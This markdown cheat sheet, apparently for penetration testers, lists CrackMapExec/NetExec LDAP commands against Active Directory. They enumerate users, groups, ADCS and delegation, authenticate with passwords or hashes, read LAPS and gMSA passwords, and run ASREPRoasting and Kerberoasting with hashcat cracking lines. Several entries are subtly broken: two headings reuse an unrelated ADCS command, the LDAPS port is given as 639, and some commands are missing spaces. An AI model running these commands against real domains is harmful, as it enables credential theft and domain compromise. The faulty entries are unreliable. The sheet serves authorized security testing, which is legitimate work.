# cme (LDAP)

% cme, crackmapexec, Active Directory, nxc, netexec, ldap

## Enumerate non-domain users
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate non-domain users.

```bash
cme ldap <dc-ip> -u <users.list> -p '' -k
```

## Enumerate domain users
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate domain users.

```bash
cme ldap <dc-ip> -u <user> -p <password> --users
```

## Enumerate users descriptions
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate domain users descriptions.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-desc-users
```

## Enumerate users info field
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate domain users info field.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-info-users
```

## Enumerate domain users with adminCount=1
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate domain users with adminCount=1.

```bash
cme ldap <dc-ip> -u <user> -p <password> --admin-count
```

## Enumerate domain computers
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate domain computers via a provided text.

```bash
cme ldap <dc-ip> -u <user> -p <password> --computers
```

## Enumerate domain groups
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate domain groups.

```bash
cme ldap <dc-ip> -u <user> -p <password> --groups
```

## Enumerate members of a domain group
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate all members within a domain groups.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M groups-mem
```

## Enumerate groups of a domain user
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate all groups for a given domain user.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M groupsmembership
```

## Enumerate DC IPs
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user 

Enumerate Domain Controllers IP addresses.

```bash
cme ldap <dc-ip> -u <user> -p <password> --dc-list
```

## Enumerate domain SID
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate the domain SID.

```bash
cme ldap <dc-ip> -u <user> -p <password> --get-sid
```

## Enumerate DNS entries 
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate DNS entries with the corresponding IP from the domain.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-network
```

## Enumerate subnets
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate the different sites and subnets of the domain.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M subnets
```

## Enumerate PKI enrollment servers (ADCS)
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

List all PKI Enrollment servers.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M adcs
```

## Enumerate templates inside a PKI (ADCS)
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

List all templates inside a PKI.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
```

## Enumerate obsolete OS
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate all hosts running on obsolete OS in the domain.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
```

## Enumerate Fine-Grained Password policy
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate the Fine-Grained password policy defined on the domain.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M adcs -o SERVER=<adcs_server>
```

## Enumerate misconfigured delegation
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate all misconfigured delegations on the domain.

```bash
cme ldap <dc-ip> -u <user> -p <password> --find-delegation
```

## Enumerate SCCM
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate SCCM entities within the domain (SCCM Site-Servers, SCCM Sites, SCCM Management Points and Users, Computers or Groups related to SCCM)

```bash
cme ldap <dc-ip> -u <user> -p <password> -M sccm -o REC_RESOLVE=TRUE
```

## Enumerate Entra ID
#assessment/AD #attack_type/Enumeration #port/389 #port/639 #protocol/ldap #access/Domain_user

Enumerate Entra ID sync servers and MSOL accounts.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M entra-id
```

## Enumerate BadSuccessor
#assessment/AD #attack_type/Quickwin #port/389 #port/639 #protocol/ldap #access/Domain_user

Check if a domain user can create a dMSA account or controls an OU where it can be created.

```bash
cme ldap <ip> -u <user> -p <password> -M badsuccessor
```

## Check MachineAccountQuota (MAQ)
#assessment/AD #attack_type/Check #port/389 #port/639 #protocol/ldap #access/Domain_user

Check the MachineAccountQuota value defined on the domain.

```bash
cme ldap <ip> -u <user> -p <password> -M maq
```

## Check LDAPS and Channel binding
#assessment/AD #attack_type/Check #port/389 #port/639 #protocol/ldap #access/Domain_user

Check whether LDAP signing and Channel binding are required and / or enforced on the domain.

```bash
cme ldap <ip> -u <user> -p <password> -M ldaps
```

## LDAP auth (no Kerberos)
#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/LDAP_user

Authenticate via a LDAP account without kerberos.

```bash
cme ldap <ip> -u <user> -p <password> -k
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Domain_user

Authenticate via a domain account.

```bash
cme ldap <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Domain_user

Authenticate via a domain account using the hash.

```bash
cme ldap <ip> -u <user> -H <hash> -d <domain>
```

## Local auth
#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme ldap <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/389 #port/639 #protocol/ldap #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme ldap <ip> -u <user> -H <hash> --local-auth
```

## Read LAPS password
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Read all LAPS passwords.

If the default local administrator name is not "administrator" add the user after the option "--laps <name>"

⚠️ Requirement : ms-Mcs-AdmPwd attribute set "Read Property" on a computer object.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M laps
```

## Read gMSA password
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Read the password of a gMSA account.

⚠️ Requirement : msDS-ManagedPassword attribute set "Read Property" on a gMSA account and LDAPS enabled.

```bash
cme ldap <dc-ip> -u <user> -p <password> --gmsa
```

## Convert gMSA LSA hash
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Convert the hash of a gMSA account when retrieved from the LSA.

```bash
cme ldap <dc-ip> -u <user> -p <password> --gmsa-convert-id <gmsa_hash>
```

## Decrypt gMSA LSA hash
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Decrypt the password of a gMSA account when retrieved from the LSA.

```bash
cme ldap <dc-ip> -u <user> -p <password> --gmsa-decrypt-lsa <SC_GMSA_{}>
```

## Get userPassword attribute
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Get userPassword attribute from all non-AD users in LDAP.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-userPassword
```

## Get unixUserPassword attribute
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Get unixUserPassword attribute from all non-AD users in LDAP.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M get-unixUserPassword
```

## Get Pre2K accounts
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each.

```bash
cme ldap <dc-ip> -u <user> -p <password> -M pre2k
```

## Get PASSWD_NOTREQD accounts
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Identify users with the flag PASSWD_NOTREQD (password not required).

```bash
cme ldap <dc-ip> -u <user> -p <password> --password-not-required
```

## Dump PSO (FGPPs or PSOs)
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Dump Fine-Grained Password Policies (FGPPs) or Password Settings Objects (PSOs).

```bash
cme ldap <dc-ip> -u <user> -p <password> --pso
```

## Unconstrained delegation
#assessment/AD #attack_type/Dump #port/389 #port/639 #protocol/ldap #access/Domain_user

Identify computers and users with the flag TRUSTED_FOR_DELEGATION.

```bash
cme ldap <dc-ip> -u <user> -p <password> --trusted-for-delegation
```

## ASREPRoast enum without authentication
#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Anonymous 

Retrieve the Kerberos AS-REP hash of user accounts without Kerberos pre-authentication required.
hashcat -m 18200 ASREProastables.txt `fzf-wordlists`

```bash
cme ldap <dc-ip> -u <users.list> -p '' --asreproast ASREProastables.txt
```

## ASREPRoast enum with authentication
#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Domain_user

Retrieve the Kerberos AS-REP hash of user accounts without Kerberos pre-authentication required.

hashcat -m 18200 ASREProastables.txt `fzf-wordlists`

```bash
cme ldap <dc-ip> -u <user> -p <password> --asreproast ASREProastables.txt
```

## Kerberoasting (SPN)
#assessment/AD #attack_type/Bruteforce #port/389 #port/639 #protocol/ldap #access/Domain_user 

Retrieve the Kerberos TGS-REP hash of user accounts with a ServicePrincipalName (SPN) using Kerberoasting.

hashcat -m13100 kerberoastables.txt `fzf-wordlists`

```bash
cme ldap <dc-ip> -u <user> -p <password> --kerberoasting kerberoastables.txt
```

## Read DACL rights
#assessment/AD #attack_type/Other #port/389 #port/639 #protocol/ldap #access/Domain_user 

Read all the ACEs of a given object.

```bash
cme ldap <dc-ip> -u <user>-p <password> -M daclread -o TARGET=<object> ACTION=read
```

## BloodHound collector
#assessment/AD #attack_type/Other #port/389 #port/639 #protocol/ldap #access/Domain_user 

Run a BloodHound data collector.

```bash
cme ldap <dc-ip> -u <user>-p <password> --bloodhound --collection All
```

= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
